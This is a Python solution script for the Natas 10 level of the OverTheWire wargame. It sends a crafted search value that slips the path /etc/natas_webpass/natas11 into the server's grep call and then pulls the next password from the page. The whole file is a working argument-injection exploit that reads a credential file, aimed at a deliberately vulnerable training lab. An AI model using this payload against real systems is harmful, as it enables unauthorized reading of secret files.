import re
import requests
import string
from halo import Halo



def get_natas11_password(natas10_password):
    URL = "http://natas10.natas.labs.overthewire.org"
    spinner = Halo(text='The password for natas 11 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas10", natas10_password)
    characters = string.digits

    for character in characters:
        payload = f"{character} /etc/natas_webpass/natas11"
        data = {"needle": payload, "submit": "true"}
        request = session.post(URL, data=data)
        passwords = re.findall(r'([a-zA-Z\d]{32})', request.text)
        if len(passwords) > 1:
            natas11_password = passwords[1]
            break

    spinner.succeed(text="The password for natas 11 is: " + natas11_password)

    return natas11_password


if __name__ == '__main__':
    natas10_password = "" # Put here the password for natas10 here
    get_natas11_password(natas10_password)
